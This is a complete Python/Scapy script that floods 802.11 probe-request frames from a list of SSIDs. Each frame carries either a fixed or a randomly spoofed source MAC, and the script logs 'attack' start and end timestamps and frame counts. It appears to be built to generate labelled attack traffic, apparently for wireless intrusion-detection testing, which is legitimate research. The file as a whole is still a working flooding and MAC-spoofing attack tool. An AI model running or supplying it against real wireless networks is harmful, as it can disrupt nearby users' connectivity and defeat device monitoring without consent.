#!/usr/bin/env python3

import random
import sys
import time
from datetime import datetime

from scapy.all import RadioTap, Dot11, Dot11ProbeReq, Dot11Elt, sendp


def mark(label: str) -> None:
    print(
        f"{label}_ISO={datetime.now().astimezone().isoformat()} "
        f"{label}_EPOCH={time.time():.6f}",
        flush=True,
    )


def random_mac() -> str:
    return "02:%02x:%02x:%02x:%02x:%02x" % tuple(
        random.randint(0, 255) for _ in range(5)
    )


def load_ssids(path: str) -> list[str]:
    with open(path, "r", encoding="utf-8") as file:
        return [line.strip() for line in file if line.strip()]


def build_probe_request(source_mac: str, ssid: str):
    return (
        RadioTap()
        / Dot11(
            type=0,
            subtype=4,
            addr1="ff:ff:ff:ff:ff:ff",
            addr2=source_mac,
            addr3="ff:ff:ff:ff:ff:ff",
        )
        / Dot11ProbeReq()
        / Dot11Elt(ID="SSID", info=ssid.encode("utf-8", errors="ignore"))
    )


def main() -> None:
    if len(sys.argv) < 6:
        print(
            "Usage:\n"
            "  sudo python3 tools/probe_flood.py "
            "IFACE SSID_FILE DURATION_SECONDS INTERVAL_SECONDS MODE [SOURCE_MAC]\n\n"
            "MODE:\n"
            "  fixed  - wszystkie probe request z jednego adresu MAC\n"
            "  random - każdy probe request z losowego adresu MAC\n"
        )
        sys.exit(1)

    iface = sys.argv[1]
    ssid_file = sys.argv[2]
    duration_seconds = float(sys.argv[3])
    interval_seconds = float(sys.argv[4])
    mode = sys.argv[5]

    if mode not in {"fixed", "random"}:
        raise ValueError("MODE must be one of: fixed, random")

    fixed_source_mac = sys.argv[6] if len(sys.argv) >= 7 else "02:12:34:56:78:9a"

    ssids = load_ssids(ssid_file)

    if not ssids:
        raise ValueError("SSID file is empty")

    mark("SCAPY_ATTACK_START")

    end_time = time.time() + duration_seconds
    sent = 0
    ssid_index = 0

    try:
        while time.time() < end_time:
            ssid = ssids[ssid_index % len(ssids)]
            ssid_index += 1

            if mode == "fixed":
                source_mac = fixed_source_mac
            else:
                source_mac = random_mac()

            packet = build_probe_request(source_mac, ssid)
            sendp(packet, iface=iface, verbose=False)

            sent += 1
            time.sleep(interval_seconds)

    except KeyboardInterrupt:
        pass

    finally:
        mark("SCAPY_ATTACK_END")
        print(f"SENT_FRAMES={sent}", flush=True)
        print(f"MODE={mode}", flush=True)
        print(f"FIXED_SOURCE_MAC={fixed_source_mac}", flush=True)
        print(f"SSID_COUNT={len(ssids)}", flush=True)


if __name__ == "__main__":
    main()
